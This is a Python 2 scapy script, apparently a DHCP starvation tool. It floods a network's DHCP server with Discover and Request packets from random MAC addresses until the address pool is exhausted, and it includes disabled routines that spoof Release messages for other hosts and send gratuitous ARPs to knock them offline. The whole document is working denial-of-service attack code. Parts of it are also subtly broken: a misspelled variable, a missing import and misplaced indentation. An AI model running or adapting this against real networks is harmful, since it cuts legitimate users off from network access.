#! /usr/bin/env python
from scapy.all import *
import string,binascii,signal,sys,threading,socket,struct
import sys

conf.checkIPaddr = False
verbose = False
show_arp = True if "show_arp" in sys.argv else False
conf.iface = sys.argv[1] if len(sys.argv)>1 else "eth2"
show_options = True if "show_options" in sys.argv else False
print "[INFO] - using interface %s"%conf.iface
timeout={}
timeout['dos']=8
timeout['dhcpip']=2
timeout['timer']=0.4

def signal_handler(signal, frame):
    print 'Exit'
    t1.kill_received = True
    t2.kill_received = True
    sys.exit(0)



######################################
def randomMAC():
    mac = [ 0x00, 0x0c, 0x29,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def toNum(ip):
    "convert decimal dotted quad string to long integer"
    return struct.unpack('L',socket.inet_aton(ip))[0]

def get_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def get_if_net(iff):
    for net, msk, gw, iface, addr in read_routes():
       if (iff == iface and net != 0L):
          return ltoa(net)
    warning("No net address found for iface %s\n" % iff);

def get_if_ip(iff):
    for net, msk, gw, iface, addr in read_routes():
       if (iff == iface and net != 0L):
          return addr
    warning("No net address found for iface %s\n" % iff);

def calcCIDR(mask):
    mask = mask.split('.')
    bits = []
    for c in mask:
       bits.append(bin(int(c)))
    bits = ''.join(bits)
    cidr = 0
    for c in bits:
        if c == '1': cidr += 1
    return str(cidr)

def unpackMAC(binmac):
   mac=binascii.hexlify(binmac)[0:12]
   blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
   return ':'.join(blocks)




##########################################################
#
#
#
def neighbors():
     global dhcpsip,subnet,nodes
     nodes={}
     m=randomMAC()
     net=dhcpsip+"/"+calcCIDR(subnet)
     ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
                    filter="arp and arp[7] = 2")
     for request,reply in ans:
       nodes[reply.hwsrc]=reply.psrc
       print "%15s - %s " % (reply.psrc, reply.hwsrc)

#
#
#
def release():
   global dhcpsmac,dhcpsip,nodes
   print "Sending Release"
   myxid=random.randint(1, 900000000)
   #
   #iterate over all ndoes and release their IP from DHCP server
   for cmac,cip in nodes.iteritems():
     dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
     sendp(dhcp_release,verbose=0)
     if verbose: print "%r"%dhcp_release

#
#
#now knock everyone offline
def garp():
  global dhcpsip,subnet
  pool=Net(dhcpsip+"/"+calcCIDR(subnet))
  for ip in pool:
    m=randomMAC()
    arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
    sendp(arpp,verbose=0)
    if verbose: print "%r"%arpp

#
# loop and send Discovers
#
class send_dhcp(threading.Thread):
   def __init__ (self):
        threading.Thread.__init__(self)
        self.kill_received = False

   def run(self):
     global timer,dhcpdos
     while not self.kill_received and not dhcpdos:
       m=randomMAC()
       myxid=random.randint(1, 900000000)
       hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
       dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
       print "[--->] DHCP_Discover"
       sendp(dhcp_discover,verbose=0)
       time.sleep(timer)

#
#
# sniff DHCP Offers and ACK
#
class sniff_dhcp(threading.Thread):
   def __init__ (self):
     threading.Thread.__init__(self)
     self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
     self.kill_received = False
     self.dhcpcount=0

   def run(self):
     global dhcpdos
     while not self.kill_received and not dhcpdos:
       sniff(filter=self.filter,prn=self.detect_dhcp, store=0,timeout=3, iface=conf.iface)
       if self.dhcpcount>0 : print "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount
       self.dhcpcount+=1
       if self.dhcpcount==2: dhcpdos=True
          
   def detect_dhcp(self,pkt):
      global dhcpsmac,dhcpsip,subnet,show_options
      if DHCP in pkt:
        if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
          self.dhcpcount=0
          dhcpsip = pkt[IP].src
          dhcpsmac = pkt[Ether].src
          for opt in pkt[DHCP].options:
           if opt[0] == 'subnet_mask':
               ubnet=opt[1]
               break

          myip=pkt[BOOTP].yiaddr
          sip=pkt[BOOTP].siaddr
          localxid=pkt[BOOTP].xid
          localm=unpackMAC(pkt[BOOTP].chaddr)
          myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
      print "[<---] DHCP_Offer   " + pkt[Ether].src,sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]"
 
      if show_options:
        b = pkt[BOOTP]
        print "\t* xid=%s"%repr(b.xid)
        print "\t* CIaddr=%s"%repr(b.ciaddr)        
        print "\t* YIaddr=%s"%repr(b.yiaddr)
        print "\t* SIaddr=%s"%repr(b.siaddr)
        print "\t* GIaddr=%s"%repr(b.giaddr)
        print "\t* CHaddr=%s"%repr(b.chaddr)
        print "\t* Sname=%s"%repr(b.sname)
        for o in pkt[DHCP].options:
          if isinstance(o,str):
            if o=="end": break        #supress spam paddings :)
            print "\t\t* ",repr(o)
          else:
            print "\t\t* ",o[0],o[1:]    
          dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
          sendp(dhcp_req,verbose=0)
          print "[--->] DHCP_Request "+myip
      #print pkt.show()

      elif ICMP in pkt:
         if pkt[ICMP].type==8:
           myip=pkt[IP].dst
           mydst=pkt[IP].src
           print "[ <- ] ICMP_Request "+mydst+" for "+myip 
           icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
         if verbose: print "%r"%icmp_req 
           #sendp(icmp_req,verbose=0)
           #print "ICMP response from "+myip+" to "+mydst 
      elif show_arp and ARP in pkt:
         if pkt[ARP].op ==1:        #op=1 who has, 2 is at
           myip=pkt[ARP].pdst
           mydst=pkt[ARP].psrc
           print "[ <- ] ARP_Request " + myip+" from "+mydst
           #anser arps?


#
#
# MAIN()
#
def main(args):
  signal.signal(signal.SIGINT, signal_handler)
  global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer,timeout
  dhcpsip=None
  dhcpsmac=None
  subnet=None
  nodes={}
  dhcpdos=False 
  timer=timeout['timer']
  
  t1=sniff_dhcp()
  t1.start()

  t2=send_dhcp()
  t2.start()

  while dhcpsip==None:
   time.sleep(timeout['dhcpip'])
   print "[  ? ] \t\twaiting for first DHCP Server response"

  #neighbors()
  #release()

  while not dhcpdos:
   time.sleep(timeout['dos'])
   print "[  ? ] \t\twaiting for DHCP pool exhaustion..."
  print "[DONE] DHCP pool exhausted!"
  #garp()


if __name__ == '__main__':
  main(sys.argv)



